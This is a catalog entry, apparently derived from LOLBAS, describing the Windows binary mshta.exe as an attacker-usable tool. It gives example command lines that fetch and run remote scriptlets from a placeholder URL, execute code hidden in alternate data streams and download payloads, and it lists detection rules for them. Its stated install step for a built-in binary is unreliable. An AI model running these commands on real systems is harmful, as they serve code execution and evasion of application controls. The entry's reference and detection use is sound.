---
id: windows-execution-mshta
namespace: windows:execution:mshta
name: mshta
description: 'Used by Windows to execute html applications. (.hta) Located at: C:\Windows\System32\mshta.exe; C:\Windows\SysWOW64\mshta.exe.'
author: Oddvar Moe
version: 1.0.0
capabilities:
- security.execution.command
- system.file.alternate-data-stream
- network.transfer.download
platforms:
- windows
risk_level: high
trust_level: community
execution_policy: enabled
architectures:
- amd64
dependencies: []
related_tools: []
artifacts: []
workflow_edges:
  produces:
  - command-output
  consumes: []
contract:
  inputs: []
  outputs:
  - type: process.output
    description: Command execution output
  side_effects:
  - filesystem_write
  - process_spawn
  - network_traffic
  resource_cost:
    cpu: low
    memory_mb: 16
    network: medium
    disk_io: low
resource_profile:
  cpu: low
  memory_mb: 16
  network: medium
  disk_io: low
allowed-tools:
- mshta
parameters: []
features: []
execution:
  template: mshta
  sandbox: execFile
  timeout_seconds: 30
  shell: false
global_vars: {}
examples:
- description: Opens the target .HTA and executes embedded JavaScript, JScript, or VBScript. (Execute code)
  command: mshta.exe {PATH:.hta}
- description: Executes VBScript supplied as a command line argument. (Execute code)
  command: mshta.exe vbscript:Close(Execute("GetObject(""script:{REMOTEURL:.sct}"")"))
- description: Executes JavaScript supplied as a command line argument. (Execute code)
  command: mshta.exe javascript:a=GetObject("script:{REMOTEURL:.sct}").Exec();close();
- description: Opens the target .HTA and executes embedded JavaScript, JScript, or VBScript. (Execute code hidden in alternate data stream)
  command: mshta.exe "{PATH_ABSOLUTE}:file.hta"
- description: It will download a remote payload and place it in INetCache. (Downloads payload from remote server)
  command: mshta.exe {REMOTEURL}
references:
- label: AppLocker_Bypass_Techniques.html#menu_index_4
  url: https://evi1cg.me/archives/AppLocker_Bypass_Techniques.html#menu_index_4
- label: mshta.sct
  url: https://github.com/redcanaryco/atomic-red-team/blob/master/Windows/Payloads/mshta.sct
- label: ''
  url: https://oddvar.moe/2017/12/21/applocker-case-study-how-insecure-is-it-really-part-2/
- label: ''
  url: https://oddvar.moe/2018/01/14/putting-data-in-alternate-data-streams-and-how-to-execute-it/
techniques:
- execution
- defense-evasion
- exfiltration
mitre_ids:
- T1218.005
- T1105
detections:
- type: sigma
  url: https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_mshta_susp_pattern.yml
- type: sigma
  url: https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_hktl_invoke_obfuscation_via_use_mhsta.yml
- type: sigma
  url: https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_mshta_lethalhta_technique.yml
- type: sigma
  url: https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_mshta_javascript.yml
- type: sigma
  url: https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/file/file_event/file_event_win_net_cli_artefact.yml
- type: sigma
  url: https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/image_load/image_load_susp_script_dotnet_clr_dll_load.yml
- type: elastic
  url: https://github.com/elastic/detection-rules/blob/f8f643041a584621e66cf8e6d534ad3db92edc29/rules/windows/defense_evasion_mshta_beacon.toml
- type: elastic
  url: https://github.com/elastic/detection-rules/blob/cc241c0b5ec590d76cb88ec638d3cc37f68b5d50/rules/windows/lateral_movement_dcom_hta.toml
- type: elastic
  url: https://github.com/elastic/detection-rules/blob/82ec6ac1eeb62a1383792719a1943b551264ed16/rules/windows/defense_evasion_suspicious_managedcode_host_process.toml
- type: splunk
  url: https://github.com/splunk/security_content/blob/08ed88bd88259c03c771c30170d2934ed0a8f878/stories/suspicious_mshta_activity.yml
- type: splunk
  url: https://github.com/splunk/security_content/blob/bee2a4cefa533f286c546cbe6798a0b5dec3e5ef/detections/endpoint/detect_mshta_renamed.yml
- type: splunk
  url: https://github.com/splunk/security_content/blob/18f63553a9dc1a34122fa123deae2b2f9b9ea391/detections/endpoint/suspicious_mshta_spawn.yml
- type: splunk
  url: https://github.com/splunk/security_content/blob/18f63553a9dc1a34122fa123deae2b2f9b9ea391/detections/endpoint/suspicious_mshta_child_process.yml
- type: splunk
  url: https://github.com/splunk/security_content/blob/bee2a4cefa533f286c546cbe6798a0b5dec3e5ef/detections/endpoint/detect_mshta_url_in_command_line.yml
- type: blockrule
  url: https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-block-rules
- type: ioc
  description: mshta.exe executing raw or obfuscated script within the command-line
- type: ioc
  description: General usage of HTA file
- type: ioc
  description: msthta.exe network connection to Internet/WWW resource
- type: ioc
  description: DotNet CLR libraries loaded into mshta.exe
- type: ioc
  description: DotNet CLR Usage Log - mshta.exe.log
install:
- method: choco
  package_name: mshta
  commands:
  - choco install mshta
---


# mshta

mshta is a Windows LOLBin. Used by Windows to execute html applications. (.hta) Located at: C:\Windows\System32\mshta.exe; C:\Windows\SysWOW64\mshta.exe.
